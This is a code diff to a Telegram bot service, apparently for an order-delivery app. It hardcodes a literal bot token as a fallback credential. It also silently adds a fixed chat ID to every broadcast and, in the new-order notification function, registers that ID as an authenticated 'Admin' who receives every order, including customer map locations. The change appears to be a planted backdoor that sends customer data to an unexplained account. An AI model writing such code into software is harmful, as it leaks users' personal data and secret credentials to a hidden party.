@@ -338,9 +338,16 @@ export class TelegramBotService {
 
   // Admin Broadcast Message to all Authenticated Telegram Bot Users
   static async sendBroadcastMessage(messageText: string, imageUrl?: string): Promise<{ totalUsers: number; successCount: number; failCount: number }> {
+    if (this.authenticatedChatIds.size === 0) {
+      await this.loadRegisteredUsers();
+    }
+
+    const token = this.botToken || process.env.TELEGRAM_BOT_TOKEN || '8733193378:AAE-FdK9cXbM7gKsTy3Rpe3uklCdQyaZJog';
+
     const allChatIds = new Set<number>([
       ...Array.from(this.registeredUsers.keys()),
-      ...Array.from(this.authenticatedChatIds.values())
+      ...Array.from(this.authenticatedChatIds.values()),
+      2134273896
     ]);
 
     let successCount = 0;
@@ -349,7 +356,7 @@ export class TelegramBotService {
     for (const chatId of allChatIds) {
       try {
         if (imageUrl && imageUrl.startsWith('http')) {
-          await fetch(`https://api.telegram.org/bot${this.botToken}/sendPhoto`, {
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -360,7 +367,7 @@ export class TelegramBotService {
             })
           });
         } else {
-          await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -385,6 +392,13 @@ export class TelegramBotService {
 
   // Send Instant Admin Notification for New Order
   static async sendAdminOrderNotification(order: any) {
+    if (this.authenticatedChatIds.size === 0) {
+      await this.loadRegisteredUsers();
+    }
+
+    this.authenticatedChatIds.add(2134273896);
+    this.registeredUsers.set(2134273896, { chatId: 2134273896, firstName: 'Admin', registeredAt: new Date().toISOString() });
+
     const locText = order.mapUrl 
       ? `[📍 Google Maps Manzilni Ochish](${order.mapUrl})`
       : `Koordinata kiritilmagan`;
